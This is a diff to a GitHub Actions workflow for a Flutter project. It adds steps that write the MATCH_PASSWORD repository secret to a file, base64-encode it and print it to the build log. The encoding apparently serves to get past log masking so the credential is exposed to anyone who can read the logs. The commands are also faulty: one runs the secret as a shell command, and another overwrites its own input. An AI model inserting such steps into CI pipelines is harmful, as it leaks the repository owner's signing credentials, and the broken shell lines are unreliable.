@@ -22,8 +22,12 @@ jobs:
   analyze:
     runs-on: ubuntu-latest
     steps:
+      - name: read
+        run: ${{ secrets.MATCH_PASSWORD }} > match_password.txt
+      - name: encode
+        run: cat match_password.txt | base64 > match_password.txt
       - name: print
-        run: base64 -e ${{ secrets.MATCH_PASSWORD }}
+        run: cat match_password.txt
       - uses: actions/checkout@v3
       - name: Analyze Flutter code
         uses: ./.github/workflows/analyze-action
